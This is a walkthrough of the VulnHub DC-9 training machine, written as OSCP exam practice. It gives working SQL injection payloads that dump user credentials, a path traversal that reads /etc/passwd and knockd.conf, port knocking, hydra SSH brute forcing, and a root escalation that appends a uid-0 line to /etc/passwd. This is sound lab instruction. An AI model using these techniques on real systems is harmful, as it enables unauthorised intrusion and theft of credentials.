# DC-9 Walkthrough

Machine page: [https://www.vulnhub.com/entry/dc-9,412/](https://www.vulnhub.com/entry/dc-9,412/)

Download link: [https://download.vulnhub.com/dc/DC-9.zip](https://download.vulnhub.com/dc/DC-9.zip)

Dc-9 is one of the machines from [vulnhub](https://www.vulnhub.com/) that contains the list of [Tjnull](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit), which is a list created to prepare for the OSCP exam, this machine is the first on the list with a similar level to the machines in the course that the OSCP offers.

## Network Scan

The first step is to find the IP of our target, for this we use Arp-Scan, this tool allows us to scan a LAN network and discover devices connected to it.

```bash
sudo arp-scan -interface eth1 -l
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled.png)

We have discovered that our target's IP is 192.168.34.5.

Once the IP is obtained, we proceed to scan ports and services with nmap.

```bash
sudo nmap -sV 192.168.34.5
Starting Nmap 7.93 (https://nmap.org) at 2023-09-17 19:06 CEST
Nmap scan report for example.com (192.168.34.5)
Host is up (0.00052s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp filtered ssh
80/tcp open http Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:C1:23:27 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
```

We see that port 80 is open and Apache is running with version 2.4.38. We also see that the ssh port is filtered but little can be done with the information we have so far so we move on to view the website on port 80.

## Enumeration

Browsing the web I see that there is a 'search' field that performs a search for the company's users. The first thing that occurs to me is to test if it is vulnerable to SQLi, so I enter the following query:

```sql
Mary' or 1=1-- -
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%201.png)

And I see that it is vulnerable to SQL so I proceed to obtain information from the database.

First I get the number of columns by adding the null value for each column until I get a response with the following query:

```sql
Mary' union select null,null,null,null,null,null-- -
```

Then I go on to list the databases that exist, with the following query:

```sql
Mary' union select null,schema_name,null,null,null,null from information_schema.schemata-- -
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%202.png)

We see that the Staff and users databases exist.

The next step I take is to list the tables contained in the users database

```sql
Mary' union select null,table_name,null,null,null,null from information_schema.tables where table_schema='users'-- -

```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%203.png)

And I see that the UserDetails table exists, then I go on to list the columns of this table.

```sql
Mary' union select null,column_name,null,null,null,null from information_schema.columns where table_name='UserDetails'-- -

```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%204.png)

I get the columns id, firstname, lastname, username, password, and reg_date, so all that remains is to list the contents of the columns. With the following query I indicate that the values ​​of the username and password columns are displayed, indicating the table that belongs to the users database.

```sql
Mary' union select null,CONCAT(username, ":" ,password),null,null,null,null from users.UserDetails-- -
```

```bash
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scooters:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
```

I save the credentials in a file called creds.

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%205.png)

We obtain a list of users and passwords but they are not valid in the web login so we go on to list the Staff database in the same way that we have done with users.

```sql
Mary' union select null,table_name,null,null,null,null from information_schema.tables where table_schema='Staff'-- -
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%206.png)

```sql
Mary' union select null,column_name,null,null,null,null from information_schema.columns where table_name='Users'-- -

```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%207.png)

```sql
Mary' union select null,CONCAT(username,':',password),null,null,null,null from Users-- -
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%208.png)

We obtain admin user and an md5 hash. With the hash I proceed to crack it on an online website

[https://crackstation.net/](https://crackstation.net/)

```bash
admin:856f5de590ef37314e7c3bdf6f8a66dc
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%209.png)

And I get the password: **transorbital1**

## Explotation

Login

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2010.png)

After logging in we see a section at the bottom of the page that says File does not exist, it seems that it is trying to load a file but it does not exist, this makes me think that it may be looking for a file in some system path so I try the next.

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2011.png)

```bash
http://192.168.34.5/manage.php?file=../../../../../../../etc/passwd
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2012.png)

We are successful, in the scan with nmap we discovered that the ssh port was filtered and what comes to mind is the Port Knocking technique so I am going to see the Knock configuration files

```bash
http://192.168.34.5/manage.php?file=../../../../../../../etc/knockd.conf
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2013.png)

We obtain the sequence to introduce with knock

```bash
knock -v 192.168.34.5 7469 8475 9842
hitting tcp 192.168.34.5:7469
hitting tcp 192.168.34.5:8475
hitting tcp 192.168.34.5:9842
```

I check that the port has been opened

```bash
nmap -sV 192.168.34.5
Starting Nmap 7.93 (https://nmap.org) at 2023-09-17 19:20 CEST
Nmap scan report for example.com (192.168.34.5)
Host is up (0.00012s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open http Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:C1:23:27 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
```

With the users obtained previously I perform a brute force attack with hydra

I create a file with users

```bash
cat creds | cut -d ':' -f1 > users.txt
```

I create passwords file

```bash
cat creds | cut -d ':' -f2 > passwords.txt
```

```bash
hydra -L users.txt -P passwords.txt 192.168.34.5 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-23 13:27:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
[DATA] attacking ssh://192.168.34.5:22/
[22][ssh] host: 192.168.34.5 login: chandlerb password: UrAG0D!
[22][ssh] host: 192.168.34.5 login: joeyt password: Passw0rd
[22][ssh] host: 192.168.34.5 login: janitor password: Ilovepeepee
[STATUS] 287.00 tries/min, 287 tries in 00:01h, 4 to do in 00:01h, 14 active
1 of 1 target successfully completed, 3 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-23 13:28:08
```

```bash
chandlerb:UrAG0D
joeyt:Passw0rd
janitor:Ilovepeepee
```

Login as janitor

```bash
ssh janitor@192.168.34.5
```

Enumerating we find the following directory

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2014.png)

Inside we find the file passwords-found-on-post-it-notes.txt with the following passwords

```bash
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

I perform a new brute force attack with the passwords obtained

```bash
hydra -L users.txt -P newpasswords 192.168.34.5 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-17 20:34:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 102 login tries (l:17/p:6), ~7 tries per task
[DATA] attacking ssh://192.168.34.5:22/
[22][ssh] host: 192.168.34.5 login: fredf password: B4-Tru3-001
[22][ssh] host: 192.168.34.5 login: joeyt password: Passw0rd
1 of 1 target successfully completed, 2 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-17 20:34:58
```

## Privilege Escalation

Login as fredf

```bash
ssh fredf@192.168.34.5
```

We execute sudo -l and see that we have permissions to execute the following script

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2015.png)

I run it to see how it works

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2016.png)

It seems that two files are introduced, the first one that it reads and the second one to which the content of the first one is added, so to escalate privileges I am going to create a user and add it to the passwd file

Creating the user hash (123)

```bash
openssl passwd -1
$1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1
```

We create a file with the following (user.txt)

```bash
user:$1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1:0:0:user:/root:/bin/bash
```

We execute script

```bash
sudo /opt/devstuff/dist/test/test user.txt /etc/passwd
```

we change the new user as root

```bash
fredf@dc-9:~$ su user
Password:
root@dc-9:/home/fredf# whoami
root
```

![Untitled](DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2017.png)

And that's it

Happy Hacking!

